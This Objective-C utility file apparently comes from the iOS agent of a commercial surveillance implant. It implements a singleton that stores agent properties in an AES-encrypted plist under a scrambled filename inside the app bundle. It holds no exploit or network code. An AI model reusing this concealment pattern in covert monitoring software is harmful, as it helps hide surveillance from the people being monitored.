/*
 * RCSiOS - Utils and stuff
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <fcntl.h>
#import <CommonCrypto/CommonDigest.h>

#import "RCSIUtils.h"

#import "RCSIGlobals.h"
#import "RCSICommon.h"
#import "RCSIEncryption.h"
#import "NSMutableData+AES128.h"

static _i_Utils *sharedInstance = nil;

//#define DEBUG
#define RCS_PLIST     @"_i_ios.plist"

@implementation _i_Utils

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (_i_Utils *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      sharedInstance = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedInstance;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedInstance != nil)
    {
      self = [super init];
      
      if (self != nil)
      {
        sharedInstance = self;
      }      
    }
  }
  
  return sharedInstance;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent property methods
#pragma mark -

- (NSString*)propFilePath
{
  NSString *retString = nil;
  NSData *keyData;
  
  keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
  
  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
  
  NSString *scramFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  
  [rcsEnc release];
  
  retString = [NSString stringWithFormat:@"%@/%@",
                                        [[NSBundle mainBundle] bundlePath],
                                        scramFileName];
  
  return  retString;
}

- (NSData*)encryptProps:(NSDictionary*)aDict
{
  NSMutableData *decPropFile =
    (NSMutableData*)[NSPropertyListSerialization  dataFromPropertyList:aDict
                                                                format:NSPropertyListBinaryFormat_v1_0
                                                      errorDescription:nil];
  
  NSData *keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
  
  NSData *encData = [decPropFile encryptPKCS7: keyData];
  
  return encData;
}

- (NSData*)decryptProps
{  
  NSString *propFileName = [self propFilePath];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: propFileName] == NO)
    return  nil;
  
  NSMutableData *encPropFile = [NSMutableData dataWithContentsOfFile: propFileName];
  
  NSData *keyData = [NSData dataWithBytes:gConfAesKey length: CC_MD5_DIGEST_LENGTH];
    
  NSData *retData = [encPropFile decryptPKCS7: keyData];
    
  return retData;
}

- (id)getPropertyWithName:(NSString*)name
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id dict = nil;
  
  @synchronized(self)
  {
    NSData *decData = [self decryptProps];
    
    if (decData != nil)
    {
      NSPropertyListFormat format;
      
      NSMutableDictionary *propDict =
        [NSPropertyListSerialization propertyListFromData: decData
                                         mutabilityOption:NSPropertyListMutableContainers
                                                   format:&format
                                         errorDescription:nil];
      
      if (propDict != nil)
        dict = [[propDict objectForKey: name] retain];
    }
  }
  
  [pool release];
  
  return dict;
}

- (BOOL)setPropertyWithName:(NSString*)name
             withDictionary:(NSDictionary*)dictionary
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableDictionary *propDict = nil;
  
  @synchronized(self)
  {
    NSData *dictData = [self decryptProps];
    
    if (dictData != nil)
    {
      NSPropertyListFormat format;
      
      propDict = [NSPropertyListSerialization propertyListFromData:dictData
                                                  mutabilityOption:NSPropertyListMutableContainers
                                                            format:&format
                                                  errorDescription:nil];
      if ([propDict objectForKey: name] == nil)
      {
        [propDict setObject:dictionary forKey: name];
      }
      else
      {
        [propDict removeObjectForKey: name];
        [propDict setObject:dictionary forKey: name];
      }
    }
    else
    {
      propDict = [NSDictionary dictionaryWithObjectsAndKeys: dictionary, name, nil];
    }
    
    NSData *encDict = [self encryptProps: propDict];
    
    NSString *propFileName = [self propFilePath];
    
    [encDict writeToFile: propFileName atomically:YES];
  }
  
  [pool release];

  return YES;
}

@end
